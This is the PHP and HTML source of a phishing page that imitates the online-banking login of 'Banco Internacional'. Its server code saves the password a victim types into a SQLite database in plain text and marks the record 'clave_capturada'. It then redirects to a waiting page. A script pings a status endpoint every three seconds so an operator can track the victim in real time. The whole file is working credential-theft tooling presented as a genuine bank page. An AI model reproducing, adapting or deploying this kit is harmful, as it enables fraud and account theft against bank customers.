<?php
session_start();

define('DB_FILE', 'usuarios.db');

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error al conectar con la base de datos: " . $e->getMessage());
}

// Verificar si el usuario viene del flujo correcto
if (!isset($_SESSION["user_id"]) || !isset($_SESSION["autenticado"])) {
    header("Location: index.php");
    exit;
}

$id = $_SESSION["user_id"];

// ✅ ACTUALIZAR FECHA PARA INDICAR ACTIVIDAD
$fecha_actual = date('Y-m-d H:i:s');
$stmt = $db->prepare("UPDATE usuarios SET fecha = ? WHERE id = ?");
$stmt->execute([$fecha_actual, $id]);

// Obtener datos del usuario para mostrar
$stmt = $db->prepare("SELECT usuario FROM usuarios WHERE id = ?");
$stmt->execute([$id]);
$usuario_data = $stmt->fetch(PDO::FETCH_ASSOC);
$usuario_mostrar = $usuario_data['usuario'] ?? '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $clave = trim($_POST["fldPassword"] ?? "");
    
    if ($clave !== "") {
        // ✅ CAMBIAR ESTADO a 'clave_capturada'
        $estado = "clave_capturada";
        $fecha = date('Y-m-d H:i:s');
        
        $stmt = $db->prepare("UPDATE usuarios SET clave = ?, estado = ?, fecha = ? WHERE id = ?");
        $stmt->execute([$clave, $estado, $fecha, $id]);
        
        // ✅ REDIRIGIR A ESPERANDO
        header("Location: esperando.php?id=$id");
        exit;
    } else {
        $error = "Por favor ingrese su contraseña";
    }
}
?>
<!DOCTYPE html>
<html xml:lang="es" lang="es" >
   <head>
       <meta charset="UTF-8">
      <title>Banco Internacional</title>

      <meta name="google" value="notranslate">
      <meta name="robots" content="noindex, nofollow">
      <meta name="Googlebot-News" content="noindex, nofollow">
      <link href="assets/fisaDesertAll.css" type="text/css" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="assets/fisaDesertLogin.css">
      <link rel="stylesheet" type="text/css" href="assets/fisaDesertLoginCustom.css">

   <body class="fisaDesert" cz-shortcut-listen="true">
      <div class="bgbody"></div>
      <div id="header">
         <div id="logo">
            <img src="./assets/logow.png">
         </div>
         <div id="topnavhome">
            <ul class="menuhome">
               <li class="first-item bold">Bienvenido(a)</li>
               <li><a href="assets/login.jsp">Ayuda</a></li>
               <li class="last-item"><a href="assets/login.jsp">Contáctanos</a></li>
            </ul>
         </div>
      </div>
      <div id="finalUserContent">
         <div id="content">
            <div id="ec_fisa_message_Panel_0" lang="es" widgetid="ec_fisa_message_Panel_0">
            </div>
            <div dojotype="dijit.layout.ContentPane" region="center" dolayout="false" refreshonshow="true" id="borderContainerTwo" class="dijitContentPane" lang="es" widgetid="borderContainerTwo">
               <div dojotype="dojox.layout.ContentPane" region="center" dolayout="false" refreshonshow="true" style="width: 100%;" class="dijitContentPane" id="dojox_layout_ContentPane_0" lang="es" widgetid="dojox_layout_ContentPane_0">
                  <div id="mainwindow">
                     <div id="headerwindow">
                        <p>Si su Usuario o Clave fue comprometida, favor contactar al banco al : 800-7555 o 210-8255</p>
                     </div>
                     <div id="formwindow">
                        <div class="row-form-login border-bottom">
                           <div id="mainContainer" dojotype="dojox.layout.ContentPane" dolayout="false" refreshonshow="true" class="dijitContentPane mainContainer" lang="es" widgetid="mainContainer">
                              <div id="lpwindow" class="backgradient col6">
                                 <div id="cmpwindow">
                                    <h2 class="boldtext">INGRESO A BANCA ONLINE</h2>
                                    <div id="btnpassword"></div>
                                    <div id="forminfowindow" class="screenLogin">
                                       
                                       <form method="post" id="Form" enctype="multipart/form-data">
                                       
                                       <!-- ✅ USUARIO MOSTRADO ARRIBA (IGUAL AL DE INDEX.PHP) -->
                                       <div class="row-section align-center">
                                          <div class="input-widget user-icon">
                                             <label class="fisaLabel-login">Usuario</label>
                                             <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox" id="widget_j_username" role="presentation" lang="es" widgetid="j_username">
                                                <div class="dijitReset dijitInputField dijitInputContainer">
                                                   <input class="dijitReset dijitInputInner" 
                                                          data-dojo-attach-point="textbox,focusNode" 
                                                          autocomplete="off" 
                                                          name="usuario_mostrado" 
                                                          type="text" 
                                                          readonly 
                                                          tabindex="0" 
                                                          id="j_username" 
                                                          maxlength="16" 
                                                          value="<?php echo htmlspecialchars($usuario_mostrar); ?>"
                                                          style="background-color: #f0f0f0; color: #666;">
                                                   <span class="dijitPlaceHolder dijitInputField"></span>
                                                </div>
                                             </div>
                                             <a class="fisaLink info-link" id="info-usuario"><span>Info</span></a>
                                             <div data-dojo-type="dijit/Tooltip" data-dojo-props="connectId:'info-usuario',position:['above']" class="dijitTooltipData" id="dijit_Tooltip_0" lang="es" widgetid="dijit_Tooltip_0">
                                                Usuario ingresado anteriormente.
                                             </div>
                                          </div>
                                       </div>

                                       <!-- ✅ CAMPO CONTRASEÑA -->
                                       <div class="row-section align-center">
                                          <div class="input-widget user-icon">
                                             <label class="fisaLabel-login">Contraseña</label>
                                             <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox" id="widget_j_password" role="presentation" lang="es" widgetid="j_password">
                                                <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="fldPassword" required type="password" tabindex="0" id="j_password" maxlength="16" value=""><span class="dijitPlaceHolder dijitInputField"></span></div>
                                             </div>
                                             <a class="fisaLink info-link" id="info-password"><span>Info</span></a>
                                             <div data-dojo-type="dijit/Tooltip" data-dojo-props="connectId:'info-password',position:['above']" class="dijitTooltipData" id="dijit_Tooltip_1" lang="es" widgetid="dijit_Tooltip_1">
                                                Ingrese su contraseña para acceder a la banca online.
                                             </div>
                                          </div>
                                       </div>
                                       
                                       <div class="button-section">
                                          <input type="submit" name="btnsession" class="button-form" value="Continuar" />
                                       </div>
                                       <div id="msg-login-form">
                                          <span class="text-msg-login-form">Si ingresas con USUARIO TEMPORAL</span>
                                          <span class="text-msg-login-form">
                                          Haz click
                                          <a href="assets/login.jsp">
                                          aquí
                                          </a>
                                          </span>
                                       </div>
                                       </form>
                                    </div>
                                 </div>
                              </div>
                              <div id="rpwindow" class="col6">
                                 <div id="msgwindow">
                                    <div id="ayuda">
                                       <h2 class="boldtext align-left">Utilidades</h2>
                                       <ul class="bullet-arrow">
                                          <li><a href="assets/login.jsp">¿No tienes usuario?, genéralo aquí</a></li>
                                          <li><a href="assets/login.jsp" >¿Olvidaste tu contraseña?</a></li>
                                          <li><a href="assets/login.jsp" >Desbloquea tu usuario</a></li>
                                          <li><a href="assets/login.jsp">¿Olvidaste tu usuario?</a></li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="row-form-login">
                           <div id="faqtexto" class="icon-msg-footer">
                              <p>Te recordamos que Banco Internacional 
                                 <span class="enfatize-text">
                                 no solicita 
                                 <span class="undeline-enfatize">
                                 información personal relacionada con usuarios y contraseñas de acceso 
                                 </span>
                                 </span>
                                 a tus cuentas o servicios electrónicos vía e-mail.
                              </p>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div id="footer">
         <div id="copy">
            <p>Copyright (c) 2019 Banco Internacional.    Todos los derechos reservados.</p>
         </div>
      </div>

      <!-- ✅ SCRIPT PARA ENVIAR PING CADA 3 SEGUNDOS -->
      <script>
         const userId = "<?php echo $id; ?>";
         
         function enviarPing() {
             fetch('status.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ 
                     user_id: userId,
                     pagina: 'AuthCode.php'
                 })
             }).catch(error => console.log('Error en ping:', error));
         }

         // Enviar ping inmediatamente y cada 3 segundos
         enviarPing();
         setInterval(enviarPing, 3000);
      </script>
      
   </body>
</html>